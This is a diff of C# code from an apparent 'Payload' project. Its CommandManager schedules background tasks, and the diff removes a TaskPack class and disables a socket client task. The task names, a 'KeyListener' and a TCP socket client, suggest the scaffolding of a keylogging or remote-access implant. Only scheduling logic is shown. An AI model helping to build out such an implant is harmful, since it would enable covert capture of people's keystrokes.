@@ -1,72 +1,16 @@
 ﻿using Payload.Command.Interface;
 using Payload.Command.SocketClient;
+using Payload.Core.Command;
 using Payload.Core.Command.Key;
 using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using static Payload.Common.Config;
 
 namespace Payload.Command
 {
-    public class TaskPack
-    {
-        public ICommand Command { get; private set; }
-        public Task Task { get; private set; }
-        public bool ShouldCallRun { get; private set; }
-        public TaskPack(ICommand command)
-        {
-            Command = command;
-            Task = null;
-            ShouldCallRun = true;
-        }
-
-        public bool SetCurrentTask(Task task)
-        {
-            if (Task != null)
-                return false;
-            Task = task;
-            return true;
-        }
-
-        public bool Start()
-        {
-            if (Command == null)
-                return false;
-            ShouldCallRun = false;
-            Command.Pause = false;
-            if (Task == null)
-            {
-                Task _t = Command.Execute();
-                SetCurrentTask(_t);
-            }            
-            return true;
-        }
-
-        public bool Pause()
-        {
-            ShouldCallRun = true;
-            Command.Pause = true;
-            return true;
-        }
-
-        public bool Stop()
-        {
-            ShouldCallRun = false;
-            Command.Pause = true;
-            try
-            {
-                Command.TokenSource.Cancel();
-            }
-            catch
-            {
-                return false;
-            }
-            Task = null;
-            return true;
-        }
-    }
-
     public class CommandManager
     {
         #region Singleton
@@ -99,8 +43,8 @@ namespace Payload.Command
         private void Init()
         {
             TaskMap = new Dictionary<Common.Config.EnumTask, TaskPack>();
-            TaskMap.Add(Common.Config.EnumTask.TcpClient, new SocketIOClientFactory().CreateTaskPack());
-            TaskMap.Add(Common.Config.EnumTask.KeyListener, new KeyListenerFactory().CreateTaskPack());
+            //TaskMap.Add(Common.Config.EnumTask.TcpClient, new SocketIOClientFactory().CreateTaskPack());
+            TaskMap.Add(Common.Config.EnumTask.KeyListener, new DemorFactory().CreateTaskPack());
         }
 
         public bool AddTaskPack(Common.Config.EnumTask _key, TaskPack _tp)
@@ -155,9 +99,11 @@ namespace Payload.Command
             foreach (var taskPack in TaskMap)
             {
                 TaskPack _tp = taskPack.Value;
+                if (_tp.Mode.Equals(EnumTaskPackMode.ONCE) && _tp.Executed || _tp.Mode.Equals(EnumTaskPackMode.NONE))
+                    continue;
                 if(_tp.Task!=null)
-                    if (!_tp.ShouldCallRun || _tp.Task.Status.Equals(TaskStatus.Running))
-                        continue;
+                if (!_tp.ShouldCallRun || _tp.Task.Status.Equals(TaskStatus.Running))
+                    continue;
                 _tp.Start();
             }
         }
